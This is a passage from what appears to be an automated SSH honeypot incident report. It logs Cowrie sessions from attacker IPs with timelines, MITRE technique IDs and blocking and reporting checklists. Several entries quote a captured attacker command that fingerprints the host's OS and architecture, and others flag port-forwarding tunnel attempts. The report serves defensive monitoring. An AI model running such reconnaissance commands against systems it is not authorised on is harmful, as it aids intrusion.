| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 20:02:42` | `cowrie.session.connect` |
| `2026-07-24 20:02:43` | `cowrie.client.version` |
| `2026-07-24 20:02:43` | `cowrie.client.kex` |
| `2026-07-24 20:02:46` | `cowrie.login.success` |
| `2026-07-24 20:02:48` | `cowrie.session.params` |
| `2026-07-24 20:02:48` | `cowrie.command.input` |
| `2026-07-24 20:02:48` | `cowrie.command.input` |
| `2026-07-24 20:02:48` | `cowrie.command.input` |
| `2026-07-24 20:02:48` | `cowrie.command.input` |
| `2026-07-24 20:02:48` | `cowrie.command.input` |
| `2026-07-24 20:02:48` | `cowrie.command.success` |
| `2026-07-24 20:02:48` | `cowrie.command.input` |
| `2026-07-24 20:02:48` | `cowrie.command.input` |
| `2026-07-24 20:02:48` | `cowrie.command.input` |
| `2026-07-24 20:02:48` | `cowrie.command.input` |
| `2026-07-24 20:02:49` | `cowrie.log.closed` |
| `2026-07-24 20:02:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2795af6a2b94

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 20:03 |
| **Last Seen** | 2026-07-24 20:03 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 20:03:01` | `cowrie.session.connect` |
| `2026-07-24 20:03:01` | `cowrie.client.version` |
| `2026-07-24 20:03:01` | `cowrie.client.kex` |
| `2026-07-24 20:03:02` | `cowrie.login.success` |
| `2026-07-24 20:03:03` | `cowrie.session.params` |
| `2026-07-24 20:03:03` | `cowrie.command.input` |
| `2026-07-24 20:03:03` | `cowrie.command.input` |
| `2026-07-24 20:03:03` | `cowrie.command.input` |
| `2026-07-24 20:03:03` | `cowrie.command.input` |
| `2026-07-24 20:03:03` | `cowrie.command.input` |
| `2026-07-24 20:03:03` | `cowrie.command.success` |
| `2026-07-24 20:03:03` | `cowrie.command.input` |
| `2026-07-24 20:03:03` | `cowrie.command.input` |
| `2026-07-24 20:03:03` | `cowrie.command.input` |
| `2026-07-24 20:03:03` | `cowrie.command.input` |
| `2026-07-24 20:03:03` | `cowrie.log.closed` |
| `2026-07-24 20:03:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d5cae174094

| Field | Detail |
|---|---|
| **Source IP** | `84.5.129[.]68` |
| **First Seen** | 2026-07-24 20:03 |
| **Last Seen** | 2026-07-24 20:03 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 20:03:45` | `cowrie.session.connect` |
| `2026-07-24 20:03:45` | `cowrie.client.version` |
| `2026-07-24 20:03:45` | `cowrie.client.kex` |
| `2026-07-24 20:03:46` | `cowrie.login.success` |
| `2026-07-24 20:03:46` | `cowrie.direct-tcpip.request` |
| `2026-07-24 20:03:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `84.5.129[.]68` to AbuseIPDB if not already reported
- [ ] Block `84.5.129[.]68` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48aaa06b5454

| Field | Detail |
|---|---|
| **Source IP** | `207.219.221[.]101` |
| **First Seen** | 2026-07-24 20:03 |
| **Last Seen** | 2026-07-24 20:03 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 20:03:45` | `cowrie.session.connect` |
| `2026-07-24 20:03:45` | `cowrie.client.version` |
| `2026-07-24 20:03:45` | `cowrie.client.kex` |
| `2026-07-24 20:03:46` | `cowrie.login.success` |
| `2026-07-24 20:03:47` | `cowrie.direct-tcpip.request` |
| `2026-07-24 20:03:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.219.221[.]101` to AbuseIPDB if not already reported
- [ ] Block `207.219.221[.]101` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f2f340eedda

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 20:03 |
| **Last Seen** | 2026-07-24 20:03 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 20:03:50` | `cowrie.session.connect` |
| `2026-07-24 20:03:51` | `cowrie.client.version` |
| `2026-07-24 20:03:51` | `cowrie.client.kex` |
| `2026-07-24 20:03:54` | `cowrie.login.success` |
| `2026-07-24 20:03:56` | `cowrie.session.params` |
| `2026-07-24 20:03:56` | `cowrie.command.input` |
| `2026-07-24 20:03:56` | `cowrie.command.input` |
| `2026-07-24 20:03:56` | `cowrie.command.input` |
| `2026-07-24 20:03:56` | `cowrie.command.input` |
| `2026-07-24 20:03:56` | `cowrie.command.input` |
| `2026-07-24 20:03:56` | `cowrie.command.success` |
| `2026-07-24 20:03:56` | `cowrie.command.input` |
| `2026-07-24 20:03:56` | `cowrie.command.input` |
| `2026-07-24 20:03:56` | `cowrie.command.input` |
| `2026-07-24 20:03:56` | `cowrie.command.input` |
| `2026-07-24 20:03:57` | `cowrie.log.closed` |
| `2026-07-24 20:03:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3ec91315578

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-24 20:04 |
| **Last Seen** | 2026-07-24 20:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 20:04:21` | `cowrie.session.connect` |
| `2026-07-24 20:04:21` | `cowrie.client.version` |
| `2026-07-24 20:04:21` | `cowrie.client.kex` |
| `2026-07-24 20:04:22` | `cowrie.login.success` |
| `2026-07-24 20:04:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-237aa514273e

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-24 20:04 |
| **Last Seen** | 2026-07-24 20:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 20:04:21` | `cowrie.session.connect` |
| `2026-07-24 20:04:21` | `cowrie.client.version` |
| `2026-07-24 20:04:21` | `cowrie.client.kex` |
| `2026-07-24 20:04:22` | `cowrie.login.success` |
| `2026-07-24 20:04:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e504a8e5f35b

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-24 20:04 |
| **Last Seen** | 2026-07-24 20:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 20:04:29` | `cowrie.session.connect` |
| `2026-07-24 20:04:29` | `cowrie.client.version` |
| `2026-07-24 20:04:29` | `cowrie.client.kex` |
| `2026-07-24 20:04:29` | `cowrie.login.success` |
| `2026-07-24 20:04:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9e41be2271c

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-24 20:04 |
| **Last Seen** | 2026-07-24 20:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 20:04:29` | `cowrie.session.connect` |
| `2026-07-24 20:04:29` | `cowrie.client.version` |
| `2026-07-24 20:04:29` | `cowrie.client.kex` |
| `2026-07-24 20:04:29` | `cowrie.login.success` |
| `2026-07-24 20:04:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a19989d985f

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 20:04 |
| **Last Seen** | 2026-07-24 20:04 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 20:04:44` | `cowrie.session.connect` |
| `2026-07-24 20:04:44` | `cowrie.client.version` |
| `2026-07-24 20:04:44` | `cowrie.client.kex` |
| `2026-07-24 20:04:45` | `cowrie.login.success` |
| `2026-07-24 20:04:46` | `cowrie.session.params` |
| `2026-07-24 20:04:46` | `cowrie.command.input` |
| `2026-07-24 20:04:46` | `cowrie.command.input` |
| `2026-07-24 20:04:46` | `cowrie.command.input` |
| `2026-07-24 20:04:46` | `cowrie.command.input` |
| `2026-07-24 20:04:46` | `cowrie.command.input` |
| `2026-07-24 20:04:46` | `cowrie.command.success` |
| `2026-07-24 20:04:46` | `cowrie.command.input` |
| `2026-07-24 20:04:46` | `cowrie.command.input` |
| `2026-07-24 20:04:46` | `cowrie.command.input` |
| `2026-07-24 20:04:46` | `cowrie.command.input` |
| `2026-07-24 20:04:47` | `cowrie.log.closed` |
| `2026-07-24 20:04:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7efcf7abc3f4

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 20:05 |
| **Last Seen** | 2026-07-24 20:05 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 20:05:01` | `cowrie.session.connect` |
| `2026-07-24 20:05:02` | `cowrie.client.version` |
| `2026-07-24 20:05:02` | `cowrie.client.kex` |
| `2026-07-24 20:05:04` | `cowrie.login.success` |
| `2026-07-24 20:05:06` | `cowrie.session.params` |
| `2026-07-24 20:05:06` | `cowrie.command.input` |
| `2026-07-24 20:05:06` | `cowrie.command.input` |
| `2026-07-24 20:05:06` | `cowrie.command.input` |
| `2026-07-24 20:05:06` | `cowrie.command.input` |
| `2026-07-24 20:05:06` | `cowrie.command.input` |
| `2026-07-24 20:05:06` | `cowrie.command.success` |
| `2026-07-24 20:05:06` | `cowrie.command.input` |
| `2026-07-24 20:05:06` | `cowrie.command.input` |
| `2026-07-24 20:05:06` | `cowrie.command.input` |
| `2026-07-24 20:05:06` | `cowrie.command.input` |
| `2026-07-24 20:05:07` | `cowrie.log.closed` |
| `2026-07-24 20:05:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c280b25170cf

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-24 20:05 |
| **Last Seen** | 2026-07-24 20:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 20:05:03` | `cowrie.session.connect` |
| `2026-07-24 20:05:03` | `cowrie.client.version` |
| `2026-07-24 20:05:03` | `cowrie.client.kex` |
| `2026-07-24 20:05:03` | `cowrie.login.success` |
| `2026-07-24 20:05:04` | `cowrie.direct-tcpip.request` |
| `2026-07-24 20:05:04` | `cowrie.direct-tcpip.data` |
| `2026-07-24 20:05:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8079d45f6b7d

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 20:06 |
| **Last Seen** | 2026-07-24 20:06 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 20:06:09` | `cowrie.session.connect` |
| `2026-07-24 20:06:10` | `cowrie.client.version` |
| `2026-07-24 20:06:10` | `cowrie.client.kex` |
| `2026-07-24 20:06:12` | `cowrie.login.success` |
| `2026-07-24 20:06:15` | `cowrie.session.params` |
| `2026-07-24 20:06:15` | `cowrie.command.input` |
| `2026-07-24 20:06:15` | `cowrie.command.input` |
| `2026-07-24 20:06:15` | `cowrie.command.input` |
| `2026-07-24 20:06:15` | `cowrie.command.input` |
| `2026-07-24 20:06:15` | `cowrie.command.input` |
| `2026-07-24 20:06:15` | `cowrie.command.success` |
| `2026-07-24 20:06:15` | `cowrie.command.input` |
| `2026-07-24 20:06:15` | `cowrie.command.input` |
| `2026-07-24 20:06:15` | `cowrie.command.input` |
| `2026-07-24 20:06:15` | `cowrie.command.input` |
| `2026-07-24 20:06:15` | `cowrie.log.closed` |
| `2026-07-24 20:06:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-102d29afc674

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 20:06 |
| **Last Seen** | 2026-07-24 20:06 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 20:06:20` | `cowrie.session.connect` |
| `2026-07-24 20:06:21` | `cowrie.client.version` |
| `2026-07-24 20:06:21` | `cowrie.client.kex` |
| `2026-07-24 20:06:22` | `cowrie.login.success` |
| `2026-07-24 20:06:23` | `cowrie.session.params` |
| `2026-07-24 20:06:23` | `cowrie.command.input` |
| `2026-07-24 20:06:23` | `cowrie.command.input` |
| `2026-07-24 20:06:23` | `cowrie.command.input` |
| `2026-07-24 20:06:23` | `cowrie.command.input` |
| `2026-07-24 20:06:23` | `cowrie.command.input` |
| `2026-07-24 20:06:23` | `cowrie.command.success` |
| `2026-07-24 20:06:23` | `cowrie.command.input` |
| `2026-07-24 20:06:23` | `cowrie.command.input` |
| `2026-07-24 20:06:23` | `cowrie.command.input` |
| `2026-07-24 20:06:23` | `cowrie.command.input` |
| `2026-07-24 20:06:23` | `cowrie.log.closed` |
| `2026-07-24 20:06:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d63b65a26c14

| Field | Detail |
|---|---|
| **Source IP** | `60.251.229[.]144` |
| **First Seen** | 2026-07-24 20:07 |
| **Last Seen** | 2026-07-24 20:07 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 20:07:10` | `cowrie.session.connect` |
| `2026-07-24 20:07:11` | `cowrie.client.version` |
| `2026-07-24 20:07:11` | `cowrie.client.kex` |
| `2026-07-24 20:07:12` | `cowrie.login.success` |
| `2026-07-24 20:07:13` | `cowrie.direct-tcpip.request` |
| `2026-07-24 20:07:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.251.229[.]144` to AbuseIPDB if not already reported
- [ ] Block `60.251.229[.]144` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-74f7ca03a334

| Field | Detail |
|---|---|
| **Source IP** | `78.197.6[.]173` |
| **First Seen** | 2026-07-24 20:07 |
| **Last Seen** | 2026-07-24 20:07 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 20:07:12` | `cowrie.session.connect` |
| `2026-07-24 20:07:12` | `cowrie.client.version` |
| `2026-07-24 20:07:12` | `cowrie.client.kex` |
| `2026-07-24 20:07:13` | `cowrie.login.success` |
| `2026-07-24 20:07:13` | `cowrie.direct-tcpip.request` |
| `2026-07-24 20:07:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `78.197.6[.]173` to AbuseIPDB if not already reported
- [ ] Block `78.197.6[.]173` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-37deb1ae5cd3

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 20:07 |
| **Last Seen** | 2026-07-24 20:07 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 20:07:17` | `cowrie.session.connect` |
| `2026-07-24 20:07:18` | `cowrie.client.version` |
| `2026-07-24 20:07:18` | `cowrie.client.kex` |
| `2026-07-24 20:07:21` | `cowrie.login.success` |
| `2026-07-24 20:07:23` | `cowrie.session.params` |
| `2026-07-24 20:07:23` | `cowrie.command.input` |
| `2026-07-24 20:07:23` | `cowrie.command.input` |
| `2026-07-24 20:07:23` | `cowrie.command.input` |
| `2026-07-24 20:07:23` | `cowrie.command.input` |
| `2026-07-24 20:07:23` | `cowrie.command.input` |
| `2026-07-24 20:07:23` | `cowrie.command.success` |
| `2026-07-24 20:07:23` | `cowrie.command.input` |
| `2026-07-24 20:07:23` | `cowrie.command.input` |
| `2026-07-24 20:07:23` | `cowrie.command.input` |
| `2026-07-24 20:07:23` | `cowrie.command.input` |
| `2026-07-24 20:07:24` | `cowrie.log.closed` |
| `2026-07-24 20:07:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae0be5db611e

| Field | Detail |
|---|---|
| **Source IP** | `180.76.104[.]208` |
| **First Seen** | 2026-07-24 20:07 |
| **Last Seen** | 2026-07-24 20:07 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 20:07:18` | `cowrie.session.connect` |
| `2026-07-24 20:07:19` | `cowrie.client.version` |
| `2026-07-24 20:07:19` | `cowrie.client.kex` |
| `2026-07-24 20:07:20` | `cowrie.login.success` |
| `2026-07-24 20:07:21` | `cowrie.direct-tcpip.request` |
| `2026-07-24 20:07:25` | `cowrie.session.closed` |

**Recommended Actions:**
